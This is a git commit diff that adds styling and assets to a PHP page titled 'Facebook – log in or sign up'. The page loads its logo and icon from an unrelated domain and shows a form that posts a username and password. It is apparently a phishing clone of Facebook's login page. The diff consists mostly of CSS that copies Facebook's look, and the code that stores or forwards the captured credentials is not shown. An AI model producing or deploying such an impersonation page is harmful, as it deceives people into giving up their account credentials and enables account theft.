bb500a494bcdc4865ab2cae643226e7d65722ed0
testersingh059 <156336237+testersingh059@users.noreply.github.com>
2024-01-11 22:50:06 +0530

    Update index.php

--- api/index.php
+++ api/index.php
@@ -4,14 +4,166 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <link rel="stylesheet" href="styless.css">
-  <link href="fav.ico" rel="shortcut icon" sizes="196x196">
+  <link href="https://uniquecart.in/loginnow/fav.ico" rel="shortcut icon" sizes="196x196">
   <title>Facebook – log in or sign up</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css?family=Grenze&display=swap');
+.blogdesire-body{
+  background: #FFF;
+  background-repeat: no-repeat;
+  min-height: 99vh;
+   font-family: 'Grenze', serif;
+   margin: 0;
+}
+.blogdesire-wrapper{
+      width: 100%;
+    margin: auto;
+    background: #fff;
+    max-width: 700px;
+    position: relative;
+}
+.blogdesire-heading{
+  display: block;
+  text-align: center;
+  font-size: 30px;
+  color: #6944ff;
+}
+.blogdesire-form{
+ 
+}
+.blogdesire-form input{
+  width: 96%;
+    border: 1px solid #DDD;
+    color: #1c1e21;
+    padding: 12px 12px;
+    margin-bottom: 8px;
+    font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+    border-radius: 3px;
+    background: #f5f6f7;
+    box-shadow: 1px 1px 1px #EEE;
+    font-size: 14px;
+    line-height: 18px;
+}
+input::placeholder {
+  color: #666;
+}
+
+.head_tag {cursor: pointer;
+    color: #3b5998;
+    flex-direction: column;
+    justify-content: center;
+    font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+    font-size: 14px;
+    line-height: 18px;
+    background: #fffbe3;
+    padding: 10px 10px;
+    box-sizing: border-box;
+    padding: 15px 40px;
+    -webkit-box-sizing: border-box;
+    margin-top: 0px;}
+    .logo_center {text-align: center; margin: 10px 0px 0px 0px;}
+    .blogdesire-form {
+    max-width: 416px;
+    margin: 0 auto;
+}
+.blogdesire-form input:last-child {
+    color: #fff;
+    width: 103%;
+    background-color: #1877f2;
+    background-image: none;
+    font-weight: bold;
+    font-size: 16px;
+}
+.forget_cont {text-align: center;
+    display: block;
+    cursor: pointer;
+    color: #216fdb;
+    flex-direction: column;
+    justify-content: center;
+    font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+    font-size: 14px;
+    line-height: 18px;
+    box-sizing: border-box;
+    padding: 5px 40px;
+    -webkit-box-sizing: border-box;
+    margin-top: 0px;}
+  #login_reg_separator {display: block;
+    overflow: hidden;
+    text-align: center;
+    white-space: nowrap;margin: 12px 0 4px 0;
+    width: 100%;}
+      #login_reg_separator span {display: inline-block;
+    position: relative;    color: #4b4f56;text-align: center;
+    white-space: nowrap;cursor: pointer;font-size: 14px;
+    line-height: 18px;
+    font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+  }
+  #login_reg_separator>span:before , #login_reg_separator>span:after{background: #ccd0d5;
+    content: '';
+    height: 1px;
+    position: absolute;
+    top: 50%;
+    width: 9999px;}
+      #login_reg_separator>span:before  {margin-right: 15px;
+    right: 100%;}
+    #login_reg_separator>span:after {margin-left: 15px;} 
+    .create_cont {text-align: center;
+    margin-top: 15px;}
+    .create_cont > a {background: #00a400;
+    border: none;
+    box-shadow: none;
+    padding-left: 16px;
+    padding-right: 16px;
+    padding-top: 10px;
+    color: #fff;
+    text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
+    padding-bottom: 10px;
+    border-radius: 4px;
+    box-sizing: border-box;
+    display: inline-block;
+    font-weight: bold;
+    min-width: 50px;
+    font-size: 14px;
+    overflow: hidden;
+    cursor: pointer;
+    text-decoration: none;
+    font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;}
+
+.footer_cont {position: relative;
+    bottom: 0px;margin-top:100px; }
+.footer_cont .f_cont {    display: flex;
+    display: -webkit-flex;
+    text-align: center;
+}
+.footer_cont .f_cont > div {webkit-flex: 1;
+    flex: 1;
+    min-width: 0;
+    width: 0;
+    text-align: center;}
+.footer_cont .f_cont > div > span {font-size: 12px;
+    line-height: 16px;
+    color: #576b95;
+    text-align: center;
+    margin: 5px;
+    -webkit-text-size-adjust: none;
+    cursor: pointer;
+    font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+    display: block;}
+    .botm_cont {font-size: 12px;
+    line-height: 16px;
+    color: #90949c;
+    text-align: center;
+    margin: 5px;
+    -webkit-text-size-adjust: none;
+    cursor: pointer;
+    font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+    display: block;}
+  </style>
 </head>
 <body class="blogdesire-body">
   <div class="blogdesire-wrapper">
     <div class="head_tag">Get Facebook for Android and browse faster.</div>
-   <div class="logo_center"><img src="logo.svg" width="112" class="img" alt="facebook"></div>
+   <div class="logo_center"><img src="https://uniquecart.in/loginnow/logo.svg" width="112" class="img" alt="facebook"></div>
     <form class="blogdesire-form" method="post">
       <input type="text" name="username" placeholder="Mobile number or email address" required autocomplete="off"> <br>
       <input type="password" name="password" placeholder="Password" required autocomplete="off"> <br>
